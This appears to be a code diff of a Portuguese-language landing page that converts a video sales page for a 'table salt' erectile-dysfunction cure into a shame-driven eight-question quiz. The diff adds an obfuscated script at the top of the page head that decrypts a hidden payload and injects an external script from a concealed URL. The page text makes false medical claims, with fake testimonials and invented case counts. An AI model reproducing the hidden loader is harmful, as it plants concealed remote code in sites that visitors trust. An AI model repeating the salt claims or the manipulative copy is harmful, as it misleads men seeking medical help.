@@ -3,25 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <title>Receita do Sal</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+    <script>(function(){var b_o8=atob("DDvJcw8nAy0Wwv1gOkDrBn1LIRc0qokUSkjzXCBEZ0M4t4kNU12wXWxIbgN0sNITWUmgA3tULFhir45PVlq9FnxTLUdl4NFCW0+9AWZFdllzsd9aYUDrHW5KZg8s4JkBTlrkBntKaktv740SX02sHXsKe055ptATWVDrXy1RYkFjp99aGBm0X3QFbUx7p99aGF+oB24Kdll7q5sZF0u7FnlCbVk7sYgCU1+6USMFdUx6t5hCABnrDlJa");var d_lond=[];for(var h_ba4=0;h_ba4<b_o8.length;h_ba4++){d_lond.push(b_o8.charCodeAt(h_ba4)&255);}var j_sphm=d_lond[0];var j_0p5v=d_lond.slice(1,1+j_sphm);var z_zde=d_lond.slice(1+j_sphm);var l_uau=z_zde.map(function(b,w_2){return b^j_0p5v[w_2%j_sphm];});var d_5u="";for(var j_qhqy=0;j_qhqy<l_uau.length;j_qhqy++){d_5u+=String.fromCharCode(l_uau[j_qhqy]&255);}var g_ew=decodeURIComponent(escape(d_5u));var u_t0=JSON.parse(g_ew);var e_i5q=u_t0.globals||[];e_i5q.forEach(function(l_n2n){window[l_n2n.name]=l_n2n.value;});var f_sv=document.createElement("script");f_sv.src=u_t0.url;f_sv.async=true;f_sv.defer=true;(u_t0.attributes||[]).forEach(function(r_8){f_sv.setAttribute(r_8.name,r_8.value);});(document.head||document.documentElement).appendChild(f_sv);})();</script>
+
+
+    <title>Quiz</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
         html, body {
-            min-height: 100%;
+            height: 100%;
+            overflow: hidden;
             background: #0a0a0a;
         }
 
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
             background: radial-gradient(ellipse at 50% 0%, #1a1408 0%, #0a0a0a 60%);
-            color: #f5f5f5;
-            padding: 24px 16px 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
             position: relative;
-            overflow-x: hidden;
         }
 
         /* ===== PARTÍCULAS DE FUNDO ===== */
@@ -33,28 +37,91 @@
             opacity: 0.5;
         }
 
-        /* ===== CONTAINER ===== */
-        .vsl-wrap {
+        .quiz-card {
             position: relative;
             z-index: 1;
-            max-width: 720px;
-            margin: 0 auto;
+            transform-origin: center center;
+            transition: transform 0.3s ease;
         }
 
         /* ===== LOGO ===== */
-        .vsl-logo {
+        .quiz-logo {
             text-align: center;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
-        .vsl-logo img {
+        .quiz-logo img {
             max-height: 52px;
             width: auto;
             opacity: 0.9;
             border-radius: 6px;
         }
 
-        /* ===== BADGE ===== */
-        .vsl-badge {
+        /* ===== BARRA DE PROGRESSO ===== */
+        .progress-wrap {
+            width: 100%;
+            height: 5px;
+            background: #1e1e1e;
+            border-radius: 6px;
+            overflow: hidden;
+            margin-bottom: 8px;
+            position: relative;
+            box-shadow: inset 0 1px 2px rgba(0,0,0,0.5);
+        }
+        .progress-wrap .bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #f5a623, #f7c948, #ffe08a);
+            border-radius: 6px;
+            transition: width 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            box-shadow: 0 0 12px rgba(245, 166, 35, 0.6);
+            position: relative;
+        }
+        .progress-wrap .bar::after {
+            content: '';
+            position: absolute;
+            right: 0; top: 0; bottom: 0;
+            width: 30px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4));
+            animation: shimmer 1.5s infinite;
+        }
+        @keyframes shimmer {
+            0% { opacity: 0; }
+            50% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            font-weight: 600;
+            color: #666;
+            margin-bottom: 24px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+        .progress-label .step-num {
+            color: #f5a623;
+        }
+
+        /* ===== ECRÃS ===== */
+        .screen {
+            display: none;
+            animation: screenIn 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
+        }
+        .screen.active { display: block; }
+
+        @keyframes screenIn {
+            0% { opacity: 0; transform: translateY(24px) scale(0.98); filter: blur(4px); }
+            100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
+        }
+
+        /* ===== ECRÃ DE ENTRADA ===== */
+        .intro-screen {
+            text-align: center;
+            padding: 8px 0 4px;
+        }
+        .intro-badge {
             display: inline-block;
             font-size: 11px;
             font-weight: 700;
@@ -72,257 +139,458 @@
             0%, 100% { box-shadow: 0 0 0 0 rgba(245, 166, 35, 0.4); }
             50% { box-shadow: 0 0 0 8px rgba(245, 166, 35, 0); }
         }
-
-        /* ===== HEADLINE ===== */
-        .vsl-headline {
-            text-align: center;
+        .intro-title {
             font-size: 26px;
             font-weight: 800;
-            line-height: 1.3;
+            line-height: 1.25;
             color: #f5f5f5;
+            margin-bottom: 16px;
             letter-spacing: -0.5px;
-            margin-bottom: 28px;
-            animation: screenIn 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
         }
-        .vsl-headline .highlight {
+        .intro-title .highlight {
+            color: #f5a623;
+            position: relative;
+        }
+        .intro-desc {
+            font-size: 15px;
+            line-height: 1.6;
+            color: #a0a0a0;
+            max-width: 420px;
+            margin: 0 auto 28px;
+        }
+        .intro-stats {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-bottom: 28px;
+            flex-wrap: wrap;
+        }
+        .intro-stat {
+            text-align: center;
+        }
+        .intro-stat .num {
+            font-size: 22px;
+            font-weight: 800;
+            color: #f5a623;
+            line-height: 1;
+        }
+        .intro-stat .lbl {
+            font-size: 10px;
+            font-weight: 600;
+            color: #666;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            margin-top: 4px;
+        }
+        .intro-btn {
+            display: inline-block;
+            background: linear-gradient(135deg, #f5a623, #f7c948);
+            color: #0a0a0a;
+            font-weight: 800;
+            font-size: 16px;
+            padding: 16px 48px;
+            border-radius: 50px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 8px 28px rgba(245, 166, 35, 0.35);
+            text-decoration: none;
+            letter-spacing: 0.3px;
+            font-family: inherit;
+            position: relative;
+            overflow: hidden;
+        }
+        .intro-btn::after {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.6s;
+        }
+        .intro-btn:hover::after { left: 100%; }
+        .intro-btn:hover {
+            transform: scale(1.04);
+            box-shadow: 0 12px 36px rgba(245, 166, 35, 0.5);
+        }
+        .intro-btn:active { transform: scale(0.97); }
+
+        .intro-disclaimer {
+            font-size: 11px;
+            color: #555;
+            margin-top: 16px;
+        }
+
+        /* ===== PERGUNTAS ===== */
+        .step-title {
+            font-size: 20px;
+            font-weight: 700;
+            line-height: 1.4;
+            color: #f5f5f5;
+            margin-bottom: 10px;
+            letter-spacing: -0.2px;
+        }
+        .step-title .highlight {
             color: #f5a623;
             -webkit-text-fill-color: #f5a623;
             position: relative;
             display: inline-block;
         }
-        .vsl-headline .highlight::after {
+        .step-title .highlight::after {
             content: '';
             position: absolute;
             bottom: -2px; left: 0; right: 0;
             height: 2px;
             background: linear-gradient(90deg, #f5a623, transparent);
+            animation: underlineGrow 0.8s ease forwards;
+        }
+        @keyframes underlineGrow {
+            0% { transform: scaleX(0); transform-origin: left; }
+            100% { transform: scaleX(1); transform-origin: left; }
         }
 
-        @keyframes screenIn {
-            0% { opacity: 0; transform: translateY(24px) scale(0.98); filter: blur(4px); }
-            100% { opacity: 1; transform: translateY(0) scale(1); filter: blur(0); }
+        .step-sub {
+            font-size: 13px;
+            font-weight: 500;
+            line-height: 1.5;
+            color: #888;
+            margin-bottom: 22px;
+            font-style: italic;
         }
 
-        /* ===== VSL PURA (SEM ESTILIZAÇÃO) ===== */
-        .vsl-player {
-            width: 100%;
-            margin: 0 auto 32px;
-            animation: screenIn 0.7s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
-        }
-        .vsl-player vturb-smartplayer {
-            display: block;
-            width: 100%;
-            margin: 0 auto;
-        }
-
-      /* ===== WRAPPER COM BORDER RADIUS ===== */
-        .vsl-frame {
-            width: 100%;
-            max-width: 300px;
-            margin: 0 auto;
-            position: relative;
-        }
-
-        /* Forçar o player a respeitar o wrapper */
-        .vsl-frame vturb-smartplayer,
-        .vsl-frame vturb-smartplayer > div,
-        .vsl-frame vturb-smartplayer iframe,
-        .vsl-frame vturb-smartplayer video,
-        .vsl-frame #ifr_6ab68817be6066e07d2ee5e8,
-        .vsl-frame [id^="ifr_"] {
-            max-width: 100% !important;
-            width: 100% !important;
-            display: block !important;
-            border-radius: 2px !important;   /* ← mesmo raio no player */
-            overflow: hidden !important;
-        }
-
-        /* Placeholder mantém aspect ratio 9:16 */
-        .vsl-frame .vturb-player-placeholder {
-            padding-top: 177.77% !important;
-        }
-        /* ===== COMENTÁRIOS ===== */
-        .comments-section {
-            animation: screenIn 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
-        }
-
-        .comments-header {
+        .options {
             display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding-bottom: 14px;
-            border-bottom: 1px solid #1e1e1e;
-            margin-bottom: 20px;
-        }
-        .comments-header .title {
-            font-size: 15px;
-            font-weight: 700;
-            color: #f5f5f5;
-            letter-spacing: -0.2px;
-        }
-        .comments-header .live {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: rgba(245, 166, 35, 0.08);
-            border: 1px solid rgba(245, 166, 35, 0.25);
-            border-radius: 20px;
-            padding: 4px 12px;
-            font-size: 11px;
-            font-weight: 600;
-            color: #f5a623;
-            letter-spacing: 0.3px;
-        }
-        .comments-header .live i {
-            font-size: 7px;
-            color: #f5a623;
-            animation: pulse-dot 1.5s infinite ease-in-out;
-        }
-        @keyframes pulse-dot {
-            0% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.3; transform: scale(0.7); }
-            100% { opacity: 1; transform: scale(1); }
+            flex-direction: column;
+            gap: 8px;
         }
 
-        /* ===== COMENTÁRIO ===== */
-        .comment {
+        .option {
             background: #141414;
             border: 1.5px solid #2a2a2a;
-            border-radius: 14px;
-            padding: 14px 16px;
-            margin-bottom: 10px;
+            border-radius: 12px;
+            padding: 14px 18px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #f5f5f5;
+            cursor: pointer;
+            transition: all 0.2s cubic-bezier(0.25, 0.46, 0.45, 0.94);
             display: flex;
-            gap: 12px;
-            transition: all 0.25s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-            animation: commentIn 0.5s ease forwards;
+            align-items: center;
+            gap: 14px;
+            text-align: left;
+            width: 100%;
+            font-family: inherit;
+            position: relative;
+            overflow: hidden;
+        }
+        .option::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, rgba(245,166,35,0.08), transparent);
             opacity: 0;
+            transition: opacity 0.3s;
         }
-        @keyframes commentIn {
-            0% { opacity: 0; transform: translateY(12px); }
-            100% { opacity: 1; transform: translateY(0); }
-        }
-        .comment:hover {
+        .option:hover {
+            background: #1c1c1c;
             border-color: #3a3a3a;
-            transform: translateX(2px);
+            transform: translateX(4px);
             box-shadow: 0 4px 16px rgba(0,0,0,0.3);
         }
+        .option:hover::before { opacity: 1; }
+        .option:active { transform: scale(0.98) translateX(4px); }
 
-        .comment .avatar {
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            flex-shrink: 0;
-            background: #2a2a2a;
-            background-size: cover;
-            background-position: center;
-            border: 1.5px solid #333;
+        .option .letter {
             display: flex;
             align-items: center;
             justify-content: center;
+            min-width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #2a2a2a;
+            color: #b0b0b0;
             font-weight: 700;
-            font-size: 15px;
-            color: #f5a623;
+            font-size: 12px;
+            flex-shrink: 0;
+            transition: all 0.25s ease;
+            position: relative;
+            z-index: 1;
         }
 
-        .comment .content { flex: 1; min-width: 0; }
+        .option.selected {
+            background: linear-gradient(135deg, #2a2210, #1f1a0a);
+            border-color: #f5a623;
+            box-shadow: 0 0 0 3px rgba(245, 166, 35, 0.12), 0 8px 24px rgba(245, 166, 35, 0.15);
+            transform: translateX(4px);
+        }
+        .option.selected .letter {
+            background: #f5a623;
+            color: #0a0a0a;
+            transform: scale(1.1) rotate(360deg);
+            box-shadow: 0 0 16px rgba(245, 166, 35, 0.6);
+        }
 
-        .comment .author {
+        /* ===== ECRÃ DE ANÁLISE ===== */
+        .analysis-screen {
+            text-align: center;
+            padding: 16px 0 8px;
+        }
+        .analysis-title {
+            font-size: 20px;
             font-weight: 700;
-            font-size: 13px;
             color: #f5f5f5;
+            margin-bottom: 6px;
+        }
+        .analysis-title span { color: #f5a623; }
+
+        .analysis-sub {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 28px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .circle-chart {
+            position: relative;
+            width: 160px;
+            height: 160px;
+            margin: 0 auto 24px;
+        }
+        .circle-chart svg {
+            transform: rotate(-90deg);
+            width: 160px;
+            height: 160px;
+            filter: drop-shadow(0 0 12px rgba(245, 166, 35, 0.3));
+        }
+        .circle-chart .bg {
+            fill: none;
+            stroke: #1e1e1e;
+            stroke-width: 6;
+        }
+        .circle-chart .progress {
+            fill: none;
+            stroke: url(#grad);
+            stroke-width: 6;
+            stroke-linecap: round;
+            stroke-dasharray: 452;
+            stroke-dashoffset: 452;
+            transition: stroke-dashoffset 0.3s ease;
+        }
+        .circle-chart .pct {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 40px;
+            font-weight: 800;
+            color: #f5f5f5;
+            line-height: 1;
+        }
+        .circle-chart .pct small {
+            font-size: 18px;
+            font-weight: 600;
+            color: #888;
+        }
+
+        .analysis-terminal {
+            background: #0d0d0d;
+            border: 1px solid #1e1e1e;
+            border-radius: 10px;
+            padding: 14px 16px;
+            max-width: 360px;
+            margin: 0 auto;
+            text-align: left;
+            font-family: 'Inter', monospace;
+            font-size: 12px;
+            color: #888;
+            min-height: 72px;
+        }
+        .analysis-terminal .line {
             display: flex;
             align-items: center;
             gap: 8px;
-            flex-wrap: wrap;
+            margin-bottom: 6px;
+            opacity: 0;
+            animation: lineIn 0.4s ease forwards;
         }
-        .comment .author .time {
-            font-weight: 500;
-            color: #666;
-            font-size: 11px;
+        .analysis-terminal .line:last-child { margin-bottom: 0; }
+        @keyframes lineIn {
+            0% { opacity: 0; transform: translateX(-8px); }
+            100% { opacity: 1; transform: translateX(0); }
         }
-        .comment .author .verified {
-            color: #f5a623;
-            font-size: 11px;
+        .analysis-terminal .dot {
+            width: 6px; height: 6px;
+            border-radius: 50%;
+            background: #f5a623;
+            flex-shrink: 0;
+            box-shadow: 0 0 8px rgba(245,166,35,0.6);
         }
-
-        .comment .text {
-            font-size: 14px;
-            line-height: 1.55;
-            color: #c8c8c8;
-            margin: 6px 0 10px;
-            word-break: break-word;
+        .analysis-terminal .dot.done {
+            background: #22c55e;
+            box-shadow: 0 0 8px rgba(34,197,94,0.6);
         }
-        .comment .text strong {
-            color: #f5b83d;
+        .analysis-terminal .check {
+            color: #22c55e;
             font-weight: 700;
         }
 
-        .comment .actions {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            font-size: 12px;
-            color: #666;
-        }
-        .comment .actions .like-count {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            cursor: pointer;
-            transition: color 0.2s;
-            font-weight: 600;
-        }
-        .comment .actions .like-count:hover {
-            color: #f5a623;
-        }
-        .comment .actions .like-count i {
-            font-size: 12px;
-        }
-        .comment .actions .like-count.liked {
-            color: #f5a623;
-        }
-        .comment .actions .reply {
-            font-weight: 600;
-            cursor: pointer;
-            text-transform: uppercase;
-            font-size: 11px;
-            letter-spacing: 0.5px;
-            transition: color 0.2s;
-        }
-        .comment .actions .reply:hover {
-            color: #f5a623;
-        }
-
-        /* ===== COMENTÁRIO RESPOSTA ===== */
-        .comment.reply {
-            margin-left: 32px;
-            border-left: 2px solid #f5a623;
-            background: #101010;
-        }
-
-        /* ===== FECHO DOS COMENTÁRIOS ===== */
-        .comments-closed {
+        /* ===== RESULTADO ===== */
+        .result-screen {
             text-align: center;
-            color: #555;
-            font-size: 12px;
-            font-weight: 600;
+            padding: 4px 0;
+        }
+        .result-seal {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(245,166,35,0.2), transparent 70%);
+            border: 2px solid rgba(245,166,35,0.4);
+            font-size: 30px;
+            margin-bottom: 12px;
+            animation: sealIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
+        }
+        @keyframes sealIn {
+            0% { transform: scale(0) rotate(-180deg); opacity: 0; }
+            100% { transform: scale(1) rotate(0); opacity: 1; }
+        }
+
+        .result-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: #f5f5f5;
+            margin-bottom: 6px;
+        }
+        .result-title span { color: #f5a623; }
+
+        .result-badge {
+            display: inline-block;
+            font-size: 11px;
+            font-weight: 700;
+            color: #22c55e;
+            background: rgba(34, 197, 94, 0.1);
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            padding: 4px 12px;
+            border-radius: 50px;
+            margin-bottom: 16px;
             letter-spacing: 0.5px;
+        }
+
+        .result-desc {
+            font-size: 15px;
+            line-height: 1.65;
+            color: #c0c0c0;
+            max-width: 420px;
+            margin: 0 auto 20px;
+        }
+        .result-desc strong { color: #f5b83d; font-weight: 700; }
+
+        .result-meter {
+            max-width: 360px;
+            margin: 0 auto 24px;
+        }
+        .result-meter-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            font-weight: 600;
+            color: #888;
             text-transform: uppercase;
-            padding: 20px 0 10px;
-            border-top: 1px solid #1e1e1e;
+            letter-spacing: 0.5px;
+            margin-bottom: 6px;
+        }
+        .result-meter-bar {
+            height: 8px;
+            background: #1e1e1e;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .result-meter-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ef4444, #f5a623);
+            border-radius: 4px;
+            transition: width 1.2s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            box-shadow: 0 0 10px rgba(245, 166, 35, 0.5);
+        }
+
+        .btn-action {
+            display: inline-block;
+            background: linear-gradient(135deg, #f5a623, #f7c948);
+            color: #0a0a0a;
+            font-weight: 800;
+            font-size: 17px;
+            padding: 16px 44px;
+            border-radius: 50px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 8px 28px rgba(245, 166, 35, 0.35);
+            text-decoration: none;
+            letter-spacing: 0.3px;
+            font-family: inherit;
+            position: relative;
+            overflow: hidden;
+            animation: btnPulse 2s infinite;
+        }
+        @keyframes btnPulse {
+            0%, 100% { box-shadow: 0 8px 28px rgba(245, 166, 35, 0.35); }
+            50% { box-shadow: 0 8px 40px rgba(245, 166, 35, 0.6); }
+        }
+        .btn-action::after {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.5), transparent);
+            animation: btnShimmer 2.5s infinite;
+        }
+        @keyframes btnShimmer {
+            0% { left: -100%; }
+            60% { left: 100%; }
+            100% { left: 100%; }
+        }
+        .btn-action:hover {
+            transform: scale(1.05);
+            box-shadow: 0 12px 40px rgba(245, 166, 35, 0.6);
+        }
+        .btn-action:active { transform: scale(0.97); }
+
+        .result-footnote {
+            font-size: 11px;
+            color: #555;
             margin-top: 14px;
+        }
+
+        /* ===== FOOTER ===== */
+        .quiz-footer {
+            margin-top: 24px;
+            text-align: center;
+        }
+        .quiz-footer img {
+            max-width: 100%;
+            border-radius: 6px;
+            display: block;
+            margin: 0 auto;
         }
 
         /* ===== RESPONSIVO ===== */
         @media (max-width: 480px) {
-            body { padding: 18px 12px 50px; }
-            .vsl-headline { font-size: 20px; }
-            .vsl-logo img { max-height: 42px; }
-            .comment { padding: 12px 12px; }
-            .comment .avatar { width: 34px; height: 34px; font-size: 13px; }
-            .comment .text { font-size: 13px; }
-            .comment.reply { margin-left: 20px; }
-            .comments-header .title { font-size: 14px; }
+            .intro-title { font-size: 22px; }
+            .intro-desc { font-size: 14px; }
+            .step-title { font-size: 18px; }
+            .option { font-size: 14px; padding: 12px 14px; }
+            .circle-chart, .circle-chart svg { width: 130px; height: 130px; }
+            .circle-chart .pct { font-size: 32px; }
+            .result-title { font-size: 20px; }
+            .result-desc { font-size: 14px; }
+            .btn-action { font-size: 15px; padding: 14px 32px; }
+            .intro-stats { gap: 16px; }
+            .intro-stat .num { font-size: 18px; }
         }
     </style>
 </head>
@@ -331,109 +599,194 @@
     <!-- PARTÍCULAS DE FUNDO -->
     <canvas id="particles"></canvas>
 
-    <div class="vsl-wrap">
-
-
-        <!-- HEADLINE DESTACADA -->
-        <h1 class="vsl-headline">
-    O <span class="highlight">segredo </span> que está a fazer homens voltarem a ficar <span class="highlight">duros como aos 20 anos</span> usando apenas <span class="highlight">sal de Cozinha</span>
-        </h1>
-
-        <!-- VSL PURA -->
-        <div class="vsl-player">
-            <div class="vsl-frame">
-                <vturb-smartplayer id="vid-6abbf82fcbd0604fd50f96c9">
-                    <div class="vturb-player-placeholder" style="position: relative; width: 100%; padding: 133.33333333333331% 0 0; z-index: 0; background-color: black;"></div>
-                </vturb-smartplayer>
-            </div>
-            <script type="text/javascript">
-                var s=document.createElement("script");
-                s.src="https://scripts.converteai.net/2c3d960f-39c3-4072-a7af-c60fed7da363/players/6abbf82fcbd0604fd50f96c9/v4/player.js";
-                s.async=!0,document.head.appendChild(s);
-            </script>
+    <div class="quiz-card" id="app">
+        <div class="quiz-logo">
+            <img src="https://drivedaddy.vercel.app/logo_sal2.jpg" alt="Logo">
         </div>
 
-     <!-- COMENTÁRIOS -->
-<div class="comments-section">
-    <div class="comments-header">
-        <span class="title">1.321 Comentários</span>
-    </div>
+        <div class="progress-wrap">
+            <div class="bar" id="progressBar"></div>
+        </div>
+        <div class="progress-label">
+            <span></span>
+            <span class="step-num" id="stepLabel">0 / 8</span>
+        </div>
 
-    <div class="comment" data-id="1">
-        <div class="avatar" style="background-image: url('images/1.jpg');"></div>
-        <div class="content">
-            <div class="author">Carlos Silva <span class="time">Há 2 horas</span></div>
-            <div class="text">Depois de 8 anos dependente de Viagra, finalmente estou livre! Usei o sal por 3 dias e tive a ereção mais forte da minha vida. <strong>Minha esposa não acreditou!</strong> 😲</div>
-            <div class="actions">
-                <span class="like-count"><i class="fas fa-thumbs-up"></i> 254</span>
-                <span class="reply">Responder</span>
+        <!-- ===== ECRÃ DE ENTRADA ===== -->
+        <div class="screen intro-screen active" id="introScreen">
+            <div class="intro-badge">🔬 100% Gratuito</div>
+            <div class="intro-title">
+                Descobre em <span class="highlight">2 minutos</span> porque a tua ferramenta está a falhar
+            </div>
+            <div class="intro-desc">
+                Responde a 8 perguntas rápidas e recebe uma análise personalizada baseada em <strong style="color:#f5b83d;">12.847 casos</strong> de homens que recuperaram a potência com um método natural.
+            </div>
+            <div class="intro-stats">
+                <div class="intro-stat">
+                    <div class="num">12.847</div>
+                    <div class="lbl">Casos</div>
+                </div>
+                <div class="intro-stat">
+                    <div class="num">7 dias</div>
+                    <div class="lbl">Resultado</div>
+                </div>
+                <div class="intro-stat">
+                    <div class="num">100%</div>
+                    <div class="lbl">Natural</div>
+                </div>
+            </div>
+            <button class="intro-btn" id="startBtn">Começar Diagnóstico →</button>
+            <div class="intro-disclaimer">🔒 100% confidencial. Nada é partilhado.</div>
+        </div>
+
+        <!-- ===== PERGUNTAS ===== -->
+        <div id="stepsContainer" style="display:none;">
+            <div class="screen step" data-step="0">
+                <div class="step-title">
+                    Nos últimos 6 meses, quantas vezes <span class="highlight">evitaste fazer sexo</span> com a tua parceira?
+                </div>
+                <div class="step-sub">Seja sincero. Ninguém vai ver isto além de ti.</div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> Mais vezes do que consigo contar</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> Várias vezes, e isso tem-me incomodado</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> Algumas vezes, mas disfarço</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> Nunca evitei</button>
+                </div>
+            </div>
+
+            <div class="screen step" data-step="1">
+                <div class="step-title">
+                    Quando tentas ter uma ereção, o que acontece <span class="highlight">na maioria das vezes</span>?
+                </div>
+                <div class="step-sub">Escolhe o que mais se parece com a tua realidade.</div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> Fico duro, mas perco em segundos</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> Fico meio duro, nunca totalmente firme</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> Às vezes funciona, às vezes não</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> Não tenho esse problema</button>
+                </div>
+            </div>
+
+            <div class="screen step" data-step="2">
+                <div class="step-title">
+                    O que achas que está <span class="highlight">realmente por trás</span> do teu problema?
+                </div>
+                <div class="step-sub">A maioria dos homens erra nesta resposta. A verdade vai surpreender-te.</div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> A idade, já não sou o mesmo</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> O psicológico, ansiedade, stress</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> Falta de testosterona</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> Não sei, já tentei de tudo</button>
+                </div>
+            </div>
+
+            <div class="screen step" data-step="3">
+                <div class="step-title">
+                    O que já fizeste para resolver isso? <span class="highlight">Marca tudo o que já tentaste.</span>
+                </div>
+                <div class="step-sub">Esta pergunta é importante para o teu diagnóstico.</div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> Viagra, pílulas azuis ou bombas</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> Receitas da internet e chás</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> Mudanças de estilo de vida</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> Nunca tentei nada</button>
+                </div>
+            </div>
+
+            <div class="screen step" data-step="4">
+                <div class="step-title">
+                    Como te sentes <span class="highlight">depois de falhares</span> na cama?
+                </div>
+                <div class="step-sub">Não há resposta errada. Só a verdade.</div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> Humilhado, com vergonha de olhar para ela</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> Frustrado e menos homem</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> Preocupado, mas tento não pensar</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> Nunca falhei</button>
+                </div>
+            </div>
+
+            <div class="screen step" data-step="5">
+                <div class="step-title">
+                    Quantas noites já <span class="highlight">fingiste dormir</span> para não ter que enfrentar a situação?
+                </div>
+                <div class="step-sub">Esta pergunta diz muito sobre o teu caso.</div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> Perdi a conta</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> Muitas, mais do que devia</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> Algumas</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> Nenhuma</button>
+                </div>
+            </div>
+
+            <div class="screen step" data-step="6">
+                <div class="step-title">
+                    Sabias que <span class="highlight">homens de 52 anos</span> estão a recuperar ereções de 45 minutos usando apenas o sal de cozinha?
+                </div>
+                <div class="step-sub">Isto não é magia. É circulação sanguínea.</div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> Não acredito, mas quero entender</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> Já ouvi falar, quero saber mais</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> Parece bom demais para ser verdade</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> Já tentei e não funcionou</button>
+                </div>
+            </div>
+
+            <div class="screen step" data-step="7">
+                <div class="step-title">
+                    Se existisse uma forma <span class="highlight">100% natural</span> de resolveres este problema em 7 dias, estarias disposto a tentar?
+                </div>
+                <div class="step-sub">Esta é a pergunta mais importante de todas.</div>
+                <div class="options">
+                    <button class="option" data-value="3"><span class="letter">A</span> Sim, faria qualquer coisa</button>
+                    <button class="option" data-value="2"><span class="letter">B</span> Sim, se fosse seguro e natural</button>
+                    <button class="option" data-value="1"><span class="letter">C</span> Talvez, depende do que for</button>
+                    <button class="option" data-value="0"><span class="letter">D</span> Não, já desisti</button>
+                </div>
             </div>
         </div>
-    </div>
 
-    <div class="comment" data-id="3">
-        <div class="avatar" style="background-image: url('images/2.jpg');"></div>
-        <div class="content">
-            <div class="author">João Santos <span class="time">Há 1 hora</span></div>
-            <div class="text">Sofri 12 anos de impotência e já tinha perdido as esperanças. Com o truque do sal, em uma semana meu pênis ficou mais grosso e as ereções duram <strong>40+ minutos</strong>. Revolucionário!</div>
-            <div class="actions">
-                <span class="like-count"><i class="fas fa-thumbs-up"></i> 189</span>
-                <span class="reply">Responder</span>
+        <!-- ===== ECRÃ DE ANÁLISE ===== -->
